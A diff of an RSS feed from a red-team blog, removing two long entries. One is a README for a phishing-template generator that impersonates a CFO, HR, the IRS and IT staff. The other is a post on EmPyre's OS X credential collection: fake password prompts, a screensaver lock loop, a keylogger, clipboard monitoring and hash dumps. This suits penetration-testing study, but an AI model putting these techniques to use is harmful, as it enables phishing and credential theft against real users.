-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Core Options:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;- Text == Text based option or output.
-- Html == Rich Html Supported for output (generally multipart Email Html/Text).
-- Link == Template supports a major link for stats or potential web download of document/Drive-by.
-- Attachment == Can support text that tells users to open or use the supplied attachment.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Email Rendering:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;- Html == This was used by some to view the HTML markup but CSS does not render correctly (Basic Templates)
-- eml == Files can be outputed via .EML to open them directly in Icedove or Outlook
-- mht == MHTML is the Mail Html Markup used and can directly rendered in Word/IE or Iceweasel via plugin
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&#34;tips-tricks-notes&#34;&gt;Tips, Tricks, Notes&lt;/h1&gt;
-
-&lt;p&gt;The following is a collection trips and tricks to get your email in!&lt;/p&gt;
-
-&lt;h2 id=&#34;get-started&#34;&gt;Get Started&lt;/h2&gt;
-
-&lt;p&gt;Please RUN the simple Setup Bash script!!!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;root@kali:~/Desktop/SimplyTemplate# sh Setup.sh
-or
-root@kali:~/Desktop/Simplytemplate# ./Setup.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;standard-commands&#34;&gt;Standard Commands&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt; [&amp;gt;] help
-	Availiable Commands:
-	-----------------------------------------
-	[use]		Select a template for use
-	[list]		List loaded Templates
-	[info]		Display metadata about a module
-	[search]		Search by Core Options / Sophistication
-	[update]	Update SimplyTemplate from Github
-	[help]		Display this menu
-	[exit]		Exit SimplyTemplate
-
-	Availiable Template Commands:
-	-----------------------------------------
-	[set]		Set a option for the Template
-	[info]		Info about loaded Templates
-	[gen]		Generate Template
-	[view]		View Sample Template
-	[render]		Render Html of Email
-	[back]		Go back to main Menu
-	[exit]		Exit SimplyTemplate
- [&amp;gt;] 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;standard-startup&#34;&gt;Standard Startup&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current: v0.1 | SimplyTemplate | [Web]: CyberSyndicates.com
- ============================================================
-   [Twitter]: @real_slacker007 | [Twitter]: @Killswitch_gui
- ============================================================
- Main Selection Menu
-
-	6 Email Templates Loaded
-
- Commands:
-
-	[use]		Select a template for use
-	[list]		List loaded Templates
-	[info]		Display metadata about a module
-	[search]	Search by Core Options / Sophistication
-	[update]	Update SimplyTemplate from Github
-	[help]		Display this menu
-	[exit]		Exit SimplyTemplate
- [&amp;gt;] 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;list-modules&#34;&gt;List Modules&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current: v0.1 | SimplyTemplate | [Web]: CyberSyndicates.com
- ============================================================
-   [Twitter]: @real_slacker007 | [Twitter]: @Killswitch_gui
- ============================================================
-
-  [*] Available Modules are:				 Core Options:			Sophistication:
-  -------------------------				 -------------			---------------
-  1)   Modules/Internal/Leadership/AppleEncryptionFBI.py [Text, Html, Link]              [Low]
-  2)   Modules/Internal/Leadership/CFOBonusStructure.py  [Html, Attachment]              [High]
-  3)   Modules/Internal/IT/NoticeofMonitoring.py         [Html, Link]                    [Low]
-  4)   Modules/Internal/IT/BlockedWebsite.py             [Html, Link]                    [Medium]
-  5)   Modules/Internal/IT/WebsiteDevelopmentTest.py     [Html, Link]                    [Low]
-  6)   Modules/Internal/IT/PhishingAlert.py              [Html, Link]                    [Low]
-  7)   Modules/Internal/IT/Office365Migration.py         [Text, Html, Link]              [High]
-  8)   Modules/Internal/Facilities/BuildingInspection.py [Html, Link]                    [Low]
-  9)   Modules/Internal/Agency/GovBudgetReduction.py     [Html, Link]                    [Medium]
-  10)  Modules/Internal/Hr/TelecommuteOpportunities.py   [Text, Html, Link]              [High]
-  11)  Modules/Internal/Hr/SocialMediaPolicy.py          [Text, Html, Attachment]        [Medium]
-  12)  Modules/Internal/Hr/PayScaleBonusGuideline.py     [Text, Html, Link]              [Medium]
-  13)  Modules/Internal/Hr/HRTaxCorectionW2.py           [Text, Html, Link]              [Medium]
-  14)  Modules/Internal/Hr/WellnessProgram.py            [Html, Link]                    [Low]
-  15)  Modules/Internal/Hr/HRNewsArticle.py              [Text, Html, Link]              [Medium]
-  16)  Modules/Internal/Marketing/CyberNews.py           [Text, Html, Link]              [High]
-  17)  Modules/External/Social/LinkedinGroup.py          [Text, Html, Link]              [Medium]
-  18)  Modules/External/News/BasicFoxNews.py             [Text, Link]                    [Low]
-  19)  Modules/External/Agency/OPMSalaryGuidelines.py    [Html, Link]                    [Medium]
-  20)  Modules/External/Agency/IRS-CorrectedW2.py        [Text, Html, Link]              [Low]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;use-a-module&#34;&gt;Use a module&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current: v0.1 | SimplyTemplate | [Web]: CyberSyndicates.com
- ============================================================
-   [Twitter]: @real_slacker007 | [Twitter]: @Killswitch_gui
- ============================================================
-
- Template Loaded: CFO Policy update to bonus.
-
-
-
- Template Required Options:
-
- Setting		Value Set			Description of Setting
- -------		---------			----------------------
- FromCFOName            Alex Jason                      The Target CFO Full Name
- FromEmail              noreply@agency.com              From Email
- FromRealEmail          alex@target.com                 The Target CFO real email
- FromTitle              Chief Financial Officer         Set the OSINT name gathered title
- TargetAddress          123 Street Las Vegas, NV, 12345 Set the Target Company Addr
- TargetCompany          Cyber Power                     Set the Target Company Full Name
- TargetLogo             http://Target.com/logo.png      Set the Target Logo
- TargetPhone            1-800-CD-FOUR                   Set the Target Toll Free line
- TargetWebLink          Target.com                      Set the real target web link
-
- Availiable Template Commands:
-
-	Command		Description
-	-------		-----------
-	[set]           Set a option for the Template
-	[info]          Info about loaded Templates
-	[gen]           Generate Template
-	[view]          View Sample Template
-	[render]        Render Html of Email
-	[back]          Go back to main Menu
-	[exit]          Exit SimplyTemplate
- [&amp;gt;] 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;simply-use-set-and-gen&#34;&gt;Simply Use Set and Gen&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current: v0.1 | SimplyTemplate | [Web]: CyberSyndicates.com
- ============================================================
-   [Twitter]: @real_slacker007 | [Twitter]: @Killswitch_gui
- ============================================================
-
- Template Information:
-
-	Name:			Cyber News Letter
-	Author			Killswitch-GUI
-	Type:			HTML/Text
-	Sophistication:		Medium
-	SampleImage:		Modules/Sample/CyberNewsLetter.png
-	Info:                   Using a custom news letter is common by HR and
-	                        other depts.                    By setting up a
-	                        proper and common HTML email you can easily
-	                        get clicks and less likely to be reported.
-
- Template Required Options:
-
- Setting		Value Set			Description of Setting
- -------		---------			----------------------
- FromFirstName          Jim                             Contacts First Name
- FromFullName           Jim Bob                         Contacts Full Name
- FromOrg                MOM, LLC                        Contacts Company
- FromProfileUrl         http://k.com                    Linkedin Full Profile URL
- FromTitle              CEO, ATD                        Contacts Full Title
- GroupName              Cyber Cyber Cyber               Requested Group to Join
- GroupUrl               %URL%                           Custom GroupURL or CS URL
- ProfilePic             http://tinyurl.com/oewvyo7      Custom GroupURL or CS URL
-
- [&amp;gt;] set FromOrg James Brown, LLC
- [&amp;gt;] gen
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/killswitch-GUI/SimplyTemplate&#34;&gt;&lt;img src=&#34;https://travis-ci.org/killswitch-GUI/SimplyTemplate.svg?branch=master&#34; alt=&#34;Build Status&#34; /&gt;&lt;/a&gt;
-&lt;a href=&#34;https://landscape.io/github/killswitch-GUI/SimplyTemplate/master&#34;&gt;&lt;img src=&#34;https://landscape.io/github/killswitch-GUI/SimplyTemplate/master/landscape.svg?style=flat&#34; alt=&#34;Code Health&#34; /&gt;&lt;/a&gt;
-&lt;a href=&#34;https://coveralls.io/github/killswitch-GUI/SimplyTemplate?branch=master&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/killswitch-GUI/SimplyTemplate/badge.svg?branch=master&#34; alt=&#34;Coverage Status&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/project/simplytemplate/</guid>
+      <description>SimplyTemplate Phishing Template Generation Made Easy. The goal of this project was to hopefully speed up Phishing Template Gen as well as an easy way to ensure accuracy of your templates. Currently my standard Method of delivering emails is the Spear Phish in Cobalt strike so you will see proper settings for that by default.
+Current Platforms Supported: * Kali Linux 2.0 * Kali Linux 1.0 * Debian (deb8u3)</description>
     </item>
     
     <item>
       <title>RAT - Repurposing Adversarial Tradecraft BSidesAugusta2015</title>
-      <link>https://cybersyndicates.com/presentations/rat/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/presentations/rat/</link>
       <pubDate>Sun, 18 Sep 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/presentations/rat/</guid>
-      <description>
-
-&lt;h3 id=&#34;rat-repurposing-adversarial-tradecraft&#34;&gt;RAT - Repurposing Adversarial Tradecraft&lt;/h3&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;//www.slideshare.net/slideshow/embed_code/key/xP4PRrSuJQGOb2&#34; width=&#34;595&#34; height=&#34;485&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;//www.slideshare.net/AlexanderRymdekoHarv/rat-repurposing-adversarial-tradecraft&#34; title=&#34;RAT - Repurposing Adversarial Tradecraft&#34; target=&#34;_blank&#34;&gt;RAT - Repurposing Adversarial Tradecraft&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a target=&#34;_blank&#34; href=&#34;//www.slideshare.net/AlexanderRymdekoHarv&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;&lt;/p&gt;
-
-
-&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
-  &lt;iframe src=&#34;//www.youtube.com/embed/v2jU8EsJMVc&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
- &lt;/div&gt;
-
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/presentations/rat/</guid>
+      <description> RAT - Repurposing Adversarial Tradecraft   RAT - Repurposing Adversarial Tradecraft  from Alexander Rymdeko-Harvey 
+  </description>
     </item>
     
     <item>
       <title>Building an empyre with python BsidesLV2016</title>
-      <link>https://cybersyndicates.com/presentations/building_a_empyre/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/presentations/building_a_empyre/</link>
       <pubDate>Sat, 13 Aug 2016 21:38:17 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/presentations/building_a_empyre/</guid>
-      <description>&lt;p&gt;&lt;iframe src=&#34;//www.slideshare.net/slideshow/embed_code/key/H2yxNzVtshXPxR&#34; width=&#34;595&#34; height=&#34;485&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;//www.slideshare.net/harmj0y/building-an-empyre-with-python&#34; title=&#34;Building an EmPyre with Python&#34; target=&#34;_blank&#34;&gt;Building an EmPyre with Python&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a target=&#34;_blank&#34; href=&#34;//www.slideshare.net/harmj0y&#34;&gt;Will Schroeder&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;&lt;/p&gt;
-
-
-&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
-  &lt;iframe src=&#34;//www.youtube.com/embed/79qzgVTP3Yc&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
- &lt;/div&gt;
-
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/presentations/building_a_empyre/</guid>
+      <description>  Building an EmPyre with Python  from Will Schroeder 
+  </description>
     </item>
     
     <item>
       <title>EmPyre Collection Operations</title>
-      <link>https://cybersyndicates.com/2016/06/empyre-collection-opperations/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/06/empyre-collection-opperations/</link>
       <pubDate>Tue, 21 Jun 2016 20:14:14 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/2016/06/empyre-collection-opperations/</guid>
-      <description>
-
-&lt;p&gt;
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 50%; width: 50%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_logo.png&#34; alt=&#34;Empyre Logo&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-This post is number 4 of the EmPyre series. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;
-
-&lt;p&gt;@rvrsh3ll — @harmj0y — @xorrior — @CptJesus&lt;/p&gt;
-
-&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;master-list-of-the-seriers-here-http-www-harmj0y-net-blog-empyre-building-an-empyre-with-python&#34;&gt;Master list of the seriers: &lt;a href=&#34;http://www.harmj0y.net/blog/empyre/building-an-empyre-with-python/&#34;&gt;Here&lt;/a&gt;&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;5/12/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;Building an EmPyre with Python&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;5/18/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://Operating with EmPyre&#34;&gt;Operating with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;5/24/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;https://www.xorrior.com/the-return-of-the-empyre/&#34;&gt;The Return Of the EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
-&lt;li&gt;5/31/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/empyre/os-x-office-macros-with-empyre/&#34;&gt;OS X Office Macros with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&#34;empyre-introduction-to-collection-operations&#34;&gt;&lt;strong&gt;EmPyre: Introduction to collection operations&lt;/strong&gt;&lt;/h3&gt;
-
-&lt;p&gt;Information gathering may be one of the most vital actions to execute on a target. When it comes to EmPyre, we have implemented a suite of tools and techniques to accomplish a large subset of our needs. The interesting part about collection is it’s often used at nearly every phase of the attack cycle. This week we will be covering the various pre &amp;amp; post collection modules we have built!&lt;/p&gt;
-
-&lt;h4 id=&#34;pre-escalation-collection-methods&#34;&gt;&lt;strong&gt;Pre-Escalation Collection Methods&lt;/strong&gt;&lt;/h4&gt;
-
-&lt;p&gt;One of our favorite, and easiest, methods is collecting a large subset of user information in OS X. Due the heavy use of SQL to store user information, it is extremely easy to query this data. For instance: with the “browser_dump” module we can start an operation to obtain browser history, which helps gain situational awareness of the target system. While this can be used in many scenarios, it is especially useful because the module does not require an elevated context; as such, it may give you pointers for the target you&amp;rsquo;re currently on. Once you are up and running in EmPyre you can dump our user’s browser history for Safari and Chrome.&lt;/p&gt;
-
-&lt;p&gt;After quickly generating some history on my test VM we have data!&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/browser_dump_empyre.png&#34; alt=&#34;Empyre Browser Dump&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;Next up on SQL data: the iMessage data store! iMessage data store is used by many targets, and is often synced with iCloud (SMS and IMessage data). The interesting thing about the iMessage app is its ability to integrate multiple chat platforms - not just standard iMessaging from Apple. Examples of platforms with this funcionality include: Yahoo, Jabber, Aol, AIM, Google, etc.  Information collection through data mining is sometimes needed for additional escalation, and iMessage makes a great location to search for data like passwords. Using the “imessage_dump” module we can search for specific terms in the users iMessage data store. This will enumerate the following:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Account – The corresponding account user&lt;/li&gt;
-&lt;li&gt;Service – The provider of the message&lt;/li&gt;
-&lt;li&gt;Country – Where the message originated&lt;/li&gt;
-&lt;li&gt;Number – If a text message, will be the senders telephone number&lt;/li&gt;
-&lt;li&gt;ROWID – This is the row the message was stored, can be helpful if you pull the DB back&lt;/li&gt;
-&lt;li&gt;Date – Date of the message&lt;/li&gt;
-&lt;li&gt;Message – The text enumerated from the selected message&lt;/li&gt;
-&lt;li&gt;Type – Secondary field for the type of account used within the app&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_message_dump.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-The next method of collection requires using osascript (Apples scripting language) we are able to force applications to prompt for credentials potentially gathering a password! Here is the “Prompt” module in action:&lt;/p&gt;
-
-&lt;p&gt;
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_prompt_attack.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-Once setup we can easily force the App of choice to prompt a dialog box requesting a password. This can be a great method to gather credentials and potentially escalate. This and the next module have been adapted from work from &lt;a href=&#34;https://twitter.com/fuzzynop?lang=en&#34;&gt;@FuzzyNop&lt;/a&gt;, so big shout out the work he puts in.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_prompt_attack2.png&#34; alt=&#34;Empyre Message Dump 2&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;One of my fellow friends, @enigma0x3 (&lt;a href=&#34;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/&#34;&gt;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)&lt;/a&gt;) has an interesting technique to get credentials on engagments using the standard Windows login prompt. The great part is OS X has something similar we are able to implement into our collection strategy. Using the osascript method we can easily weaponize the “ScreenSaverEngine” application to request credentials.  We can force the standard screensaver, request creds, and test them against the current users Apple Key Chain. Using the &lt;strong&gt;security&lt;/strong&gt; command we can lock the users key chain and use the creds supplied to attempt to unlock using the follwing command: **security unlock-keychain –p Test. **This can be easily deployed in a loop to only unlock the screensaver when the user successfully enters the correct credentials. While it may not be extremely OPSEC friendly, it may go unnoticed and sucessfuly result in creds.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_screensaver_prompt.png&#34; alt=&#34;Empyre Screen Saver Prompt&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;A user will be prompted repeatedly until successful creds or the exit count is reached.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_screensaver_prompt2.png&#34; alt=&#34;Empyre Screen Saver Prompt2&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;One of the key collection modules we use during an engagment is clipboard collection. The main reason clipboard monitoring is key in our tradecraft is due to the ease of collection when keylogging fails to capture creds. This allows you to gather credentials and target specific times when password vaults are used in conjunction with the screenshot. Allowing for targeted collection of potential passwords and sensitive data. Using native API calls NSPasteboard, NSStringPboardType we can prevent using built in commands and potential signatures that could get us caught.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_clipboard_monitor.png&#34; alt=&#34;Empyre Clipboard monitor&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;h3 id=&#34;post-exploit-collection-methods&#34;&gt;&lt;strong&gt;Post-Exploit Collection Methods&lt;/strong&gt;&lt;/h3&gt;
-
-&lt;p&gt;Often during operations, we move from a recon &amp;amp; escalation stage to a post exploitation information gathering process. This is truly the heart of end state operations and proper tools can help speed up the process as well as help a tester reach the data / show impact. When EmPyre was being developed we often attempted to explain and relate it to processes and procedures used during a windows environment.&lt;/p&gt;
-
-&lt;p&gt;The first module I want to start with is the screenshot module. Due to testers reliance on this module it may be one of the most important post exploitation modules in our arsenal. While EmPyre currently supports two different techniques of screenshot, the native_screenshot module may be concern if certain AV products are in place. This is due to using the &lt;em&gt;screenshot&lt;/em&gt; command, and potential logging.  While the standard module uses system APIs to capture the screen, parse the image, and drop to disk in a temporary location. During my research I did uncover a few methods to properly parse all the images completely in memory, but currently due to lack of the PIL library standalone 2.7 does not have the ability to parse completely in memory.  So relying on the Quartz API is a current constraint in this method.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_native_screenshoot.png&#34; alt=&#34;Empyre Native Screenshot&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;One feature within the EmPyre code base is different tasking types. This allows for different code paths of execution. For example, the iMessage module used dynamic code execution while the screenshot uses dynamic code execution with saved output. This is done by dropping to disk, opening the file, base64ing the raw file and the EmPyre server, and then saving it to your downloads folder. This makes for easy file management for modules and keeps things organized.&lt;/p&gt;
-
-&lt;p&gt;Once basic situational awareness has been completed on a target, we often transition to reaching end state client goals. This is often referred to as the “Crown Jewels” or high value targets. Generally, it takes a large amount of post exploitation intelligence and the ability to collect on all your endpoints. Keylogging is an amazing technique that has been extremely successful for gathering creds, enumerating users work roles, collecting info, or even understanding the tools they are using to interact with the asset. Bellow you will see this being employed using an adapted ruby keylogger. @ joev  (&lt;a href=&#34;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r&#34;&gt;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r)&lt;/a&gt;)&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;Once the key logger is up and running you can easily check it using the built in shell commands or once complete kill the PID, use the built in download, and delete the file from disk.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger2.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;Once the file has been retrieved from the target you will have something similar (to the below) representing the application, key stroke, and keyboard commands.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger3.png&#34; alt=&#34;Empyre Keylogger 3&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;While operating on OS X you for sure miss the ease of mimikatz for gathering credentials, but while password collection is possible in some cases cracking potential evaluated accounts, admins or service accounts may be extremely useful for lateral movement. Within EmPyre we have built in the ability for hashdump and nicely output these hashes in hashcat ready format!&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_hashdump.png&#34; alt=&#34;Empyre Hashdump&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;It is often thought that due to the out-of-the box setup that lateral movement is just not an option. This is not always the case in the corporate environments. Admins are generally going to administrate, right? They need some method of software, patch, or user management for their end points. This can result in SSH being deployed to most corporate OS X assets, or maybe a custom solution. While this blog does not cover the Kerberos implications, in corporate environments, due to the heavy use of Active Directory it can be an entirely new method of lateral movement. Stay tuned for more on that subject!&lt;/p&gt;
-
-&lt;p&gt;The last module we will be covering is the keychaindump. While this module may result in a large subset of user data and crucial passwords it does have limitations. Currently, this will not work against the latest OS X platform. The latest usable version was Yosemite, due to a vulnerability that allowed for researches to pull the master key candidate from memory once in an elevated state. Due to the new System Integrity Protections (SIP) in El Captain the ability to retrieve this master key has been properly stored in memory protected by SIP.  Not all hope is lost though! I have been extremely successful in using other tools to parse the keychain with the user’s credentials. This can be done with either a memory image or the keychain file itself.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
